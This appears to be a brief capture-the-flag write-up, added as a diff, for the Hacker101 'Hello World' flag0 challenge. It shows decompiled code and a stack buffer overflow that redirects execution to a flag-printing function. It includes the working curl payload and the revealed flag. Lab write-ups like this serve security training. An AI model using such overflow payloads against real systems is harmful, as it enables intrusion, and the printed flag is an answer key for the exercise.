@@ -1,0 +1,40 @@
+https://github.com/testerting/hacker101-ctf/tree/master/hello_world/flag0
+
+Use ghidra to analyze the binary and decompile it.
+
+undefined8 main(void)
+{
+  char local_28 [32];
+  
+  memset(local_28,0,0x20);
+  read_all_stdin(local_28);
+  if (local_28[0] == '\0') {
+    puts("What is your name?");
+  }
+  else {
+    printf("Hello %s!\n",local_28);
+  }
+  return 0;
+}
+
+void print_flags(void)
+{
+  char *__s;
+  
+  __s = getenv("FLAGS");
+  puts(__s);
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+
+print_flags() is at 0x004006ee which means we can overflow the input to overwrite the return address in main() to jump to print_flags().
+
+user@kali:~/workspace$ curl -X GET http://34.74.105.127/95055c7453/?stdin=012345678901234567890123456789012345789%00%ee%06%40%00%00%00%00%00%00
+
+                <a href="vulnerable">Download binary</a><br><br>
+                <form>Stdin: <input type="text" name="stdin"> <input type="submit"></form>
+                <pre>Hello 012345678901234567890123456789012345789!
+["^FLAG^ecd30bb5ac31248130f3056035527354c35204977b62e165f7cc74c2932f1b46$FLAG$"]
+
+</pre>
+
